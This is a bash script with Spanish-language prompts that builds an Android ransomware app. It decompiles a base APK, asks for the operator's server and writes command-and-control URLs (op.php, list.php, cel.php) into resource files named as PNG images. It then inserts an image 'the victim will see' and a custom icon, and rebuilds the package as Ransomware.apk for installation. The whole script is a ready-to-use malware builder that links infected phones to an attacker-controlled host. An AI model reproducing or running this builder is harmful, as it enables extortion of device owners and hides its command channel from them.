mkdir $HOME/MgToLs/RANSOMWARE
dpkg -i .ap/apktool_2.3.4_all.deb
apktool d --no-src base.apk
bash .banner
echo "Introduce el enlace que de tu host:"
read host

vat=$(echo "$host/op.php" |& tee base/res/drawable-xhdpi-v4/ipe.png)
vay=$(echo "$host/list.php" |& tee base/res/drawable-xhdpi-v4/mensaje.png)

bash .banner
echo "Introduce la imagen que vera la victima:"
read url
bash .banner

vau=$(cp $url -r base/res/drawable-xhdpi-v4/url.png)

bash .banner
echo "Introduce el icono de la app:"
read icon
cp $icon -r base/res/drawable-xhdpi-v4/app_icon.png

vai=$(echo "$host/cel.php" |& tee base/res/drawable-xhdpi-v4/cel.png)
vao=$(echo "$host/list.txt" |& tee base/res/drawable-xhdpi-v4/msgd.png)

bat=$(echo "$host/op.txt" |& tee .ip)
bay=$(echo "$host/list.php" |& tee .list)
bau=$(echo "$host/cel.txt" |& tee .cel)
bai=$(echo "$host/list.txt" |& tee .lise)

xar=$(pwd)

apktool b base/ --output $HOME/MgToLs/RANSOMWARE/Ransomware.apk
cp $HOME/MgToLs/.apked -r $HOME/MgToLs/RANSOMWARE/ApkEditor.apk
rm -fr base

bash .banner
echo "Tu apk ha sido configurada correctamente!"
echo ""
echo "Ahora ve a la carpeta $HOME/MgToLs/RANSOMWARE/ e instala"
echo "Apk Editor pro y siguie las instucciones del video!"
echo ""
read pause
bash Antaki.sh
